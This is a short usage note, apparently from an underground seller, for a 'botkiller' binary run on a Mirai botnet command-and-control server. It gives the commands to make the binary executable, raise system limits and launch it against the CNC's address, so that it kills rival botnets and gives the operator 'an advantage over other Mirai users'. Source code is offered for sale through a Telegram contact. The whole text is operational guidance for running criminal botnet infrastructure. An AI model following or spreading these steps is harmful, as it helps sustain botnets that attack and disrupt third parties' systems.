Before you start you need to run the Mirai cnc (with any bot killer)

After the cnc is running, you need to write the following commands

chmod 777 botkiller

ulimit -n 1000000; ulimit -i unlimited; ulimit -l unlimited; ulimit -q unlimited; ulimit -s unlimited; ulimit -u unlimited; sysctl -w fs.inotify.max_user_watches=1000000

./botkiller localhost
./botkiller <Server IP address with Mirai cnc> 
          example: ./botkiller 197.23.163.1


Bot killer successfully launched, this script kills all known botnets and gives you an advantage over other Mirai users!

If you want to get the source code of this script, please send me a message by telegram:  @sp00fd


!!!Warning!!!
This should be done directly on the server with the Mirai botnet itself!

2024 WORKS!!!
